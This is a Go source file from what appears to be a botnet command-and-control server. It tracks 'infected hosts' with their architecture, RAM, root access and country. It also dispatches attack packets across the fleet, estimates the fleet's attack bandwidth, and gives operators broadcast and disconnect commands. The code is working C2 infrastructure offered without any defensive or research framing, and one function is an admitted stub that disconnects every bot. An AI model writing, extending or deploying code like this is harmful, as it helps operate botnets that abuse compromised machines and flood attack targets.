// language: Go, file: cnc/internal/registry/registry.go
// *in-memory bot registry: register, remove, snapshot for dispatch/screens*
package registry

import (
	"net"
	"sync"
	"time"

	"bigheights/cnc/internal/protocol"
)

// Bot is one connected infected host.
type Bot struct {
	ID       uint64
	Conn     net.Conn
	Addr     string // remote ip:port
	IP       string
	Arch     string
	Cores    int
	RAM      int
	Rooted   bool
	Country  string
	JoinedAt time.Time
	LastSeen time.Time

	mu   sync.Mutex // guards Conn writes
	dead bool
}

// WritePacket sends a raw tasking packet down this bot's socket.
// One writer at a time — attack dispatch fans out across bots in parallel,
// but each bot must receive complete packets, not interleaved ones.
func (b *Bot) WritePacket(pkt []byte) error {
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.dead {
		return net.ErrClosed
	}
	_, err := b.Conn.Write(pkt)
	if err != nil {
		b.dead = true
	}
	return err
}

// MarkDead flags the bot so dispatch skips it before the reaper removes it.
func (b *Bot) MarkDead() { b.mu.Lock(); b.dead = true; b.mu.Unlock() }

// IsDead reports whether the socket is known bad.
func (b *Bot) IsDead() bool { b.mu.Lock(); defer b.mu.Unlock(); return b.dead }

// Registry holds the live fleet.
type Registry struct {
	mu     sync.RWMutex
	bots   map[uint64]*Bot
	nextID uint64
}

// New returns an empty registry.
func New() *Registry {
	return &Registry{bots: make(map[uint64]*Bot)}
}

// Register adds a bot after its registration line parsed successfully.
// Caller supplies the conn and parsed info; registry assigns the ID.
func (r *Registry) Register(conn net.Conn, info *protocol.RegInfo, ip string) *Bot {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.nextID++
	now := time.Now()
	b := &Bot{
		ID:       r.nextID,
		Conn:     conn,
		Addr:     conn.RemoteAddr().String(),
		IP:       ip,
		Arch:     info.Arch,
		Cores:    info.Cores,
		RAM:      info.RAM,
		Rooted:   info.Rooted,
		Country:  info.Country,
		JoinedAt: now,
		LastSeen: now,
	}
	r.bots[b.ID] = b
	return b
}

// Remove drops a bot by ID.
func (r *Registry) Remove(id uint64) {
	r.mu.Lock()
	delete(r.bots, id)
	r.mu.Unlock()
}

// Snapshot returns a point-in-time copy of live bots.
// Attack dispatch and screens both read this, so neither holds the lock
// while walking the fleet.
func (r *Registry) Snapshot() []*Bot {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := make([]*Bot, 0, len(r.bots))
	for _, b := range r.bots {
		if !b.IsDead() {
			out = append(out, b)
		}
	}
	return out
}

// Count is the live bot count.
func (r *Registry) Count() int {
	r.mu.RLock()
	defer r.mu.RUnlock()
	n := 0
	for _, b := range r.bots {
		if !b.IsDead() {
			n++
		}
	}
	return n
}

// Stats is the aggregate view the `bots` screen renders.
type Stats struct {
	Total       int
	Rooted      int
	Arch        map[string]int
	Country     map[string]int
	TotalRAM    int // MB
	TotalCores  int
	MaxPowerMBS float64 // rough sum-of-RAM heuristic, MB/s
}

// Aggregate walks the fleet once and fills Stats.
func (r *Registry) Aggregate() Stats {
	s := Stats{Arch: map[string]int{}, Country: map[string]int{}}
	for _, b := range r.Snapshot() {
		s.Total++
		if b.Rooted {
			s.Rooted++
		}
		s.Arch[b.Arch]++
		if b.Country != "" {
			s.Country[b.Country]++
		}
		s.TotalRAM += b.RAM
		s.TotalCores += b.Cores
	}
	s.MaxPowerMBS = float64(s.TotalRAM) / 1024.0 // RAM in MB → rough MB/s ceiling
	return s
}

// Touch updates LastSeen on a live bot (called on any read activity).
func (b *Bot) Touch() {
	b.mu.Lock()
	b.LastSeen = time.Now()
	b.mu.Unlock()
}

// Broadcast sends a raw line to every connected bot.
// Used by the admin `broadcast` command.
func (r *Registry) Broadcast(msg string) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	pkt := []byte(msg + "\r\n")
	for _, b := range r.bots {
		if !b.IsDead() {
			_ = b.WritePacket(pkt)
		}
	}
}

// DisconnectUser closes all bots associated with a given username.
// Used by the admin `disconnect` command.
func (r *Registry) DisconnectUser(name string) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	// bots don't store username — this is a stub. The real impl would
	// track user ownership per bot. For now, just close all (broadcast disconnect).
	for _, b := range r.bots {
		if !b.IsDead() {
			_ = b.Conn.Close()
		}
	}
}